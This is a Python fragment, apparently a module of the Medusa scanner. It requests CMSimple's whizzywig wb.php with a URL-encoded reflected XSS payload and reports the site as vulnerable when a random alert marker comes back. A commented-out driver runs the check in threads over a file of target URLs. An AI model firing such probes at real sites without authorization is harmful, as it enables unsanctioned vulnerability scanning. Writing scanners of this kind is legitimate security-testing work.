# if __name__ == '__main__':
#     UrlList=[]
#     ThredList=[]
#     with open("123.txt", 'r', encoding='UTF-8') as f:
#         line = f.readline()
#         while line:
#             line.replace('\n', '')  # 删除\n符号
#             ThredList.append(threading.Thread(target=medusa, args=(line,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36",)))
#             line = f.readline()
#     for t in ThredList:  # 开启列表中的多线程
#         t.setDaemon(True)
#         t.start()
# medusa("","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36")

from ClassCongregation import randoms
rm = randoms().result(10)
payload = '/whizzywig/wb.php?d=%27%3E%3Cscript%3Ealert%28%27{}%27%29%3C/script%3E'.format(rm)
payload_url = scheme + "://" + url + ":" + str(port) + payload
resp = requests.get(payload_url, timeout=6, verify=False)
con = resp.text
if con.find('<script>alert("' + rm + '")</script>') != -1:
    Medusa = "{}存在CMSimple跨站脚本漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url, payload_url, con)